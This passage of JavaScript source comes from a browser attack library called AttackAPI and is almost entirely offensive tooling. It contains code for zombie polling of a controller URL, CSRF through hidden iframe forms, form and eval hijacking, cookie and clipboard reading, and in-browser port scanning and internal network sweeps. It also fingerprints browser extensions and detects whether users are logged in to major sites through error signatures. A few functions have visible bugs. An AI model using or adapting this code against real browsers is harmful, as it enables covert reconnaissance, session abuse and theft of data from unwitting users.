		script.src = request.url + '?' + AttackAPI.utils.buildQuery(request.query);
	else
		script.src = request.url;
		
	document.body.appendChild(script);
	
	tmr = window.setTimeout(function () {
		document.body.removeChild(script);
		
		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:1000);
};

AttackAPI.dom.requestXSS = function (request) {
	var tmr = null;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	ifr.onload = function () {
		window.clearTimeout(tmr);
		
		var data = null;
		try {
			data = AttackAPI.getDocument(ifr).body.innerHTML;
		} catch (e) {}	
		
		ifr.src = '';
		document.body.removeChild(ifr);
		
		if (typeof(request.onload) == 'function')
			request.onload({data: data}, request);
	};
	
	if (request.query)
		ifr.src = request.url + '?' + AttackAPI.utils.buildQuery(request.query);
	else
		ifr.src = request.url;
		
	document.body.appendChild(ifr);
			
	tmr = window.setTimeout(function () {
		ifr.src = '';
		document.body.removeChild(ifr);

		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:1000);
};

AttackAPI.dom.spider = function (spider) {
	AttackAPI.dom.requestXML({url: spider.url, timeout: spider.timeout,
		onload: function (response, request) {
			// analise and return all possible links
		}
	});
};
AttackAPI.dom.request = function (request) {
	var turl = AttackAPI.utils.parseURL(request.url);
	var curl = AttackAPI.utils.parseURL(document.location);

	if (turl.protocol == curl.protocol && turl.hostname == curl.hostname && turl.port == curl.port)
		return AttackAPI.dom.requestXML(request);
	else
		return AttackAPI.dom.requestCSRF(request);
};

AttackAPI.dom.detachEvent = function (callback, event, target, capturing) {
	var target = (target == undefined)?window:target;
	var capturing = (capturing == undefined)?false:true;
	
	if (target.removeEventListener)
		target.removeEventListener(event, callback, capturing);
	else
		target.detachEvent('on' + event, callback);
};

AttackAPI.dom.parseXML = function (xml, type) {
	if (window.ActiveXObject) {
		var xmlDoc = new ActiveXObject('Microsoft.XMLDOM');
		xmlDoc.async = false;
		xmlDoc.loadXML(xml);
		
		return xmlDoc;
	} else {
		var parser = new DOMParser();
		var xmlDoc = parser.parseFromString(xml, type?type:'text/xml');
		
		return xmlDoc;
	}
};
AttackAPI.dom.transport = function (request) {
	var url = request.url + '?' + AttackAPI.utils.buildQuery(request.query);
	
	if (url.length <= 2048)
		return AttackAPI.dom.requestIMG(request);
	else
		return AttackAPI.dom.requestCSRF(AttackAPI.core.extend(request, {method: 'POST'}));
};

AttackAPI.dom.spawnZombie = function (zombie) {
	var zombie = AttackAPI.dom.spawnChannel(zombie);
	
	zombie.timer = null;
	zombie.interval = (zombie.interval != undefined)?zombie.interval:2000;
	
	zombie.start = function () {
			zombie.stop();
			zombie.timer = window.setInterval(zombie.pull, zombie.interval);
	};
	
	zombie.stop = function () {
			window.clearInterval(zombie.timer);			
	};
	
	return zombie;
};

AttackAPI.dom.getAgent = function () {
	var agent = '';
	
	if (navigator.userAgent)
		agent = navigator.userAgent;
	else if (navigator.vendor)
		agent = navigator.vendor;
	else if (window.opera)
		agent = 'opera';
		
	agent = agent.toLowerCase();
	
	if (/webkit/.test(agent))
		return 'safari';
	else if (/opera/.test(agent))
		return 'opera';
	else if (/msie/.test(agent) && !/opera/.test(agent))
		return 'msie';
	else if (/mozilla/.test(agent) && !/(compatible|webkit)/.test(agent))
		return 'mozilla';
	else
		return null;
};

AttackAPI.dom.getClipboard = function () {
	if (window.clipboardData)
		return window.clipboardData.getData('Text');
		
	return null;
};

AttackAPI.dom.hijackEval = function (hijack) {
	window.__eval = window.eval;
	window.eval = function (expr) {
		if (typeof(hijack.oneval) == 'function')
			hijack.oneval(expr);
			
		window.__eval(expr);
	};
};
AttackAPI.dom.requestJSL = function (url) {
	var script = document.createElement('script');
	script.defer = true;
	script.type = 'text/javascript';
	script.src = url;
	script.onload = script.onerror = function () {
		document.body.removeChild(script);
	};
	
	document.body.appendChild(script);
};

AttackAPI.dom.requestIMGL = function (url) {
	var img = new Image();
	img.src = url;
};

AttackAPI.dom.getXHR = function () {
	var xhr = null;
	
	if (window.XMLHttpRequest)
		xhr = new XMLHttpRequest();
	else if (window.createRequest)
		xhr = window.createRequest();
	else if (window.ActiveXObject) {
		try {
			xhr = new ActiveXObject('Msxml2.XMLHTTP');
		} catch (e) {
			try {
				xhr = new ActiveXObject('Microsoft.XMLHTTP');
			} catch (e) {}
		}
	}
	
	return xhr;
};
AttackAPI.dom.searchGoogle = function (query) {
	AttackAPI.dom.requestJSON({
		url: 'http://www.google.com/uds/GwebSearch',
		query: {
			context: (query.context != undefined)?query.context:0,
			key: (query.key != undefined)?query.key:'internal-documentation',
			lstkp: 0, rsz: 'large', hl: 'en', v: '0.1', q: query.query
		},
		oncallback: query.onresults});
};
AttackAPI.dom.getInternalIP = function () {
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		return sock.getLocalAddress().getHostAddress();	
	} catch (e) {}
	
	return '127.0.0.1';
};

AttackAPI.dom.requestCSRF = function (request) {
	var tmr = null;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	
	document.body.appendChild(ifr);
	
	var doc = AttackAPI.dom.getDocument(ifr);
	
	var form = document.createElement('form');
	form.setAttribute('method', request.method?request.method:'GET');
	form.setAttribute('action', request.url);
	
	for (var name in request.query) {
		var input = document.createElement('input');
		input.setAttribute('name', name);
		input.setAttribute('value', request.query[name]);
		input.setAttribute('type', 'text');
		
		form.appendChild(input);
	}
	
	doc.body.appendChild(form);

	ifr.onload = function () {
		window.clearTimeout(tmr);
		
		var data = null;
		
		try {
			data = AttackAPI.dom.getDocument(ifr).body.innerHTML;
		} catch (e) {}
		
		ifr.src = '';
		document.body.removeChild(ifr);
		
		if (typeof(request.onload) == 'function')
			request.onload({data: data}, request);
	};
	
	tmr = window.setTimeout(function () {
		document.body.removeChild(ifr);
		
		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:10000);
	
	form.submit();
};

AttackAPI.dom.scanStates = function (scan) {
	var signatures = (scan.signatures != undefined)?scan.signatures:AttackAPI.dom.signatures.states;
	var timeout = (scan.timeout != undefined)?scan.timeout:5000;
	var timers = [];
	var count = 0;
	
	var sandbox = AttackAPI.dom.spawnSandbox({
		onerror: function (message, url, line) {
			count += 1;
			
			for (var i = 0; i < signatures.length; i++)
				if ((!signatures[i].message || new RegExp(signatures[i].message).exec(message)) && (!signatures[i].url || signatures[i].url == url) && (signatures[i].line == undefined || signatures[i].line == line)) {
					window.clearTimeout(timers[i]);
					
					if (typeof(scan.onfound) == 'function')
						scan.onfound(signatures[i], scan);
						
					break;
				}
				
			if (count == signatures.length && typeof(scan.oncomplete) == 'function') {
				scan.oncomplete();
				sandbox.terminate();
			}
			
			return true;
		},
		inject: function(url) {
			var script = sandbox.scope.document.createElement('script');
			script.type = 'text/javascript';
			script.defer = true;
			script.src = url;
			
			sandbox.scope.document.body.appendChild(script);
		}
	});
	
	for (var i = 0; i < signatures.length; i++) {
		sandbox.evaluate("inject('" + signatures[i].url + "')");
		timers.push(window.setTimeout(AttackAPI.core.bindFunction(function (signature) {
			count += 1;
			
			if (typeof(scan.ontimeout) == 'function')
				scan.ontimeout(signature);
			
			if (count == signatures.length) {
				sandbox.terminate();
				
				if (typeof(scan.oncomplete) == 'function')
					scan.oncomplete();
			}
		}, signatures[i]), timeout));
	}
};

AttackAPI.dom.requestXML = function (request) {
	var xhr = AttackAPI.dom.getXHR();
	
	if (!xhr) {
		if (typeof(request.onerror) == 'function')
			request.onerror('request implementation not found', request);
			
		return;
	}
	
	var tmr = window.setTimeout(function () {
		xhr.abort();
		
		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:10000);
	
	xhr.onreadystatechange = function () {
		if (xhr.readyState == 4) {
			window.clearTimeout(tmr);
			
			if (typeof(request.onload) == 'function')
				request.onload({status: xhr.status, data: xhr.responseText, dataXML: xhr.responseXML, headers: xhr.getAllResponseHeaders()}, request);
		}
	};
	
	try {
		var method = request.method?request.method:'GET';
		var url = request.url + (method == 'GET' && request.query?'?' + AttackAPI.utils.buildQuery(request.query):'');
		
		xhr.open(method, url);
		
		if (request.headers)
			for (var header in request.headers)
				xhr.setRequestHeader(header, request.headers[header]);
				
		xhr.send(request.body?request.body:(method != 'GET' && request.query?AttackAPI.utils.buildQuery(request.query):null));
	} catch (e) {
		if (typeof(request.onerror) == 'function')
			request.onerror(e, request);
			
		return;
	}
};

AttackAPI.dom.getCookie = function (cookie) {
	var tokens = document.cookie.split(';');
	
	for (var index = 0; index < tokens.length; index++) {
		var pair = tokens[index].replace(/^\s*/, '');
		
		if (cookie == unescape(pair.substring(0, name.length)))
			return unescape(pair.substring(name.length + 1));
	}
	
	return null;
};

AttackAPI.dom.setClipboard = function (value) {
	if (window.clipboardData)
		return window.clipboardData.getData('Text', value);
		
	return null;
};

AttackAPI.dom.sweepPorts = function (sweep) {
	var range = AttackAPI.utils.net2range(sweep.network);
	var length = range.stop - range.start;
	var count = 0;
	
	for (var i = range.start; i <= range.stop; i++)
		AttackAPI.dom.scanPorts({target: AttackAPI.utils.number2ip(i), ports: sweep.ports, timeout: sweep.timeout,
			onfound: function (port, scan) {
				if (typeof(sweep.onfound) == 'function')
					sweep.onfound({ip: scan.target, port: port}, sweep);
			},
			ontimeout: function (port) {
				if (typeof(sweep.ontimeout) == 'function')
					sweep.ontimeout({ip: scan.target, port: port}, sweep);
			},
			oncomplete: function () {
				count += 1;
				
				if (count == length && typeof(sweep.oncomplete) == 'function')
					sweep.oncomplete(sweep);
			}
		});
};
AttackAPI.dom.scanPorts = function (scan) {
	var ports = (scan.ports != undefined)?scan.ports:AttackAPI.dom.signatures.ports;
	var timeout = (scan.timeout != undefined)?scan.timeout:900;
	
	function check(port, index, length) {
		var img = new Image();
		img.onload = img.onerror = function () {
			if (!img) return;
			img = undefined;
			
			if (typeof(scan.onfound) == 'function')
				scan.onfound(port, scan);
				
			if (index == length - 1 && typeof(scan.oncomplete) == 'function')
				scan.oncomplete(scan);
		};
		img.src = 'http://' + scan.target + ':' + port;
		
		window.setTimeout(function () {
			if (!img) return;
			img = undefined;
			
			if (typeof(scan.ontimeout) == 'function')
				scan.ontimeout(port, scan);
				
			if (index == length - 1 && typeof(scan.oncomplete) == 'function')
				scan.oncomplete(scan);
		}, timeout);
	}
	
	for (var i = 0; i < ports.length; i++)
		check(ports[i], i, ports.length);
};

AttackAPI.dom.hijackForm = function (hijack) {
	if (!hijack.form.id)
		hijack.form.id = ('form_' + Math.random() + '_' + new Date().getTime()).replace('.', '_');
		
	hijack.form.__hijackForm = function (url) {
		this.action = url;
		
		if (typeof(hijack.onsubmit) == 'function') 
			hijack.onsubmit.apply(this, []);
			
		this.submit();
	};
	
	hijack.form.action = "javascript:document.getElementById('" + hijack.form.id + "').__hijackForm('" + hijack.form.action + "')";
};

AttackAPI.dom.getPlugins = function () {
	var plugins = new Array();
	
	for (var index = 0; index < navigator.plugins.length; index++)
		plugins.push(navigator.plugins[index].name);
	
	return plugins;
};

AttackAPI.dom.requestJSON = function (request) {
	if (AttackAPI.dom.requestJSON.callbacks == undefined)
		AttackAPI.dom.requestJSON.callbacks = {};
		
	var callbackName = 'c' + new Date().getTime();
	AttackAPI.dom.requestJSON.callbacks[callbackName] = function () {
		if (typeof(request.oncallback) == 'function')
			request.oncallback.apply(request, arguments);
	};
	
	var query = request.query?request.query:{};
	query[request.callback?request.callback:'callback'] = 'AttackAPI.dom.requestJSON.callbacks.' + callbackName;
	
	AttackAPI.dom.requestJSL(request.url + '?' + AttackAPI.utils.buildQuery(query));
};
AttackAPI.dom.include = function (url, onload) {
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.defer = true;
	script.src = url;
	script.onload = function () {
		document.body.removeChild(script);

		if (typeof(onload) == 'function')
			onload.apply(script, arguments);
	};
	
	document.body.appendChild(script);
};

AttackAPI.dom.hijackView = function (obj) {
	var doc = obj.document?obj.document:AttackAPI.dom.getDocument();
	
	var ifr = doc.createElement('iframe');
	ifr.onload = obj.onload;
	ifr.src = obj.url?obj.url:doc.location;
	
	doc.body.scroll = 'no';
	doc.body.appendChild(ifr);
	
	ifr.style.position = 'absolute';
	ifr.style.width = ifr.style.height = '100%';
	ifr.style.top = ifr.style.left = ifr.style.border = 0;
	ifr.style.background = '#FFFFFF';
	
	ifr.focus();
	
	return ifr;
};
AttackAPI.dom.getPlatform = function () {
	return navigator.platform.toLowerCase();
};

AttackAPI.dom.setCookie = function (cookie, value, expires, path, domain, secure) {
	document.cookie = cookie + '=' + escape(value) +
		((expires == undefined)?'':'; expires=' + expires) +
		((path == undefined)?'':'; path=' + path) +
		((domain == undefined)?'':'; domain=' + domain) +
		((secure == undefined)?'':'; secure=' + secure);
};

AttackAPI.dom.getCookies = function () {
	var cookies = new Object();
	var tokens = document.cookie.split(';');
	
	for (var index = 0; index < tokens.length; index++) {
		var pair = tokens[index].split('=');
		
		if (pair[1] && !(pair[0] in cookies))
			cookies[unescape(pair[0])] = unescape(pair[1]);
	}
	
	return cookies;	
};

AttackAPI.dom.delCookie = function (cookie) {
	return document.cookie = name + '=' + null;
};

AttackAPI.dom.zombiefyL = function (url, interval) {
	var interval = (interval == 'undefined')?interval:2000;

	window.setInterval(function () {
		AttackAPI.dom.requestJSL(url + '?action=pull');
	}, interval);
};

AttackAPI.dom.requestXSSL = function (url) {
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	ifr.src = url;
	
	document.body.appendChild(ifr);
};

AttackAPI.dom.getInternalNetworkInfo = function () {
	var info = {hostname: 'localhost', IP: '127.0.0.1'};
	
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		info.IP = sock.getLocalAddress().getHostAddress();	
		info.hostname = sock.getLocalAddress().getHostName();	
	} catch (e) {}
	
	return info;
};

AttackAPI.dom.signatures = new Object();

AttackAPI.dom.signatures.ports = [
	21, 22, 23, 25, 53, 80, 110, 118, 137, 139, 143, 161, 389, 443, 445, 547, 8000, 8008, 8080, 8888];

AttackAPI.dom.signatures.sites = [
	'http://www.yahoo.com/',
	'http://www.google.com/',
	'http://www.myspace.com/',
	'http://www.msn.com/',
	'http://www.ebay.com/',
	'http://www.youtube.com/',
	'http://www.facebook.com/',
	'http://www.wikipedia.org/',
	'http://www.craigslist.org/',
	'http://www.amazon.com/',
	'http://www.live.com/',
	'http://www.blogger.com/',
	'http://www.aol.com/',
	'http://www.cnn.com/',
	'http://www.go.com/',
	'http://www.microsoft.com/',
	'http://www.comcast.net/',
	'http://www.imdb.com/',
	'http://www.weather.com/',
	'http://www.digg.com/'];

AttackAPI.dom.signatures.extensions = [
	{name: 'Adblock Plus', url: 'chrome://adblockplus/skin/adblockplus.png'},
	{name: 'Customize Google', url: 'chrome://customizegoogle/skin/32x32.png'},
	{name: 'DownThemAll!', url: 'chrome://dta/content/immagini/icon.png'},
	{name: 'Faster Fox', url: 'chrome://fasterfox/skin/icon.png'},
	{name: 'Flash Block', url: 'chrome://flashblock/skin/flash-on-24.png'},
	{name: 'FlashGot', url: 'chrome://flashgot/skin/icon32.png'},
	{name: 'Google Toolbar', url: 'chrome://google-toolbar/skin/icon.png'},
	{name: 'Greasemonkey', url: 'chrome://greasemonkey/content/status_on.gif'},
	{name: 'IE Tab', url: 'chrome://ietab/skin/ietab-button-ie16.png'},
	{name: 'IE View', url: 'chrome://ieview/skin/ieview-icon.png'},
	{name: 'JS View', url: 'chrome://jsview/skin/jsview.gif'},
	{name: 'Live HTTP Headers', url: 'chrome://livehttpheaders/skin/img/Logo.png'},
	{name: 'SEO For Firefox', url: 'chrome://seo4firefox/content/icon32.png'},
	{name: 'Search Status', url: 'chrome://searchstatus/skin/cax10.png'},
	{name: 'Server Switcher', url: 'chrome://switcher/skin/icon.png'},
	{name: 'StumbleUpon', url: 'chrome://stumbleupon/content/skin/logo32.png'},
	{name: 'Torrent-Search Toolbar', url: 'chrome://torrent-search/skin/v.png'},
	{name: 'User Agent Switcher', url: 'chrome://useragentswitcher/content/logo.png'},
	{name: 'View Source With', url: 'chrome://viewsourcewith/skin/ff/tb16.png'},
	{name: 'Web Developer', url: 'chrome://webdeveloper/content/images/logo.png'}];

AttackAPI.dom.signatures.states = [
	{name: 'Google Logged In User', url: 'https://www.google.com/accounts/ManageAccount', message: 'XML tag name mismatch', line: 91},
	{name: 'GMail Logged In User', url: 'http://mail.google.com/mail/', message: 'XML tag name mismatch', line: 8},
	{name: 'MSN Logged In User', url: 'http://my.msn.com/', message: 'missing } in XML expression', line: 1},
	{name: 'Hotmail Logged In User', url: 'http://www.hotmail.com/', message: 'missing } in XML expression', line: 1},
	{name: 'Yahoo Mail Logged In User', url: 'http://mail.yahoo.com/', message: 'missing } in XML expression', line: 12},
	{name: 'Flickr Logged In User', url: 'http://www.flickr.com/account', message: 'syntax error', line: 1}];

/* hook on $A */
if ($A == undefined) {	
	var $A = {};
	
	for (var item in AttackAPI) {
		if (item == 'version' || item == 'author' || item == 'homepage' || item == 'projecthome')
			continue;
			
		AttackAPI.core.extend($A, AttackAPI[item]);
	}
}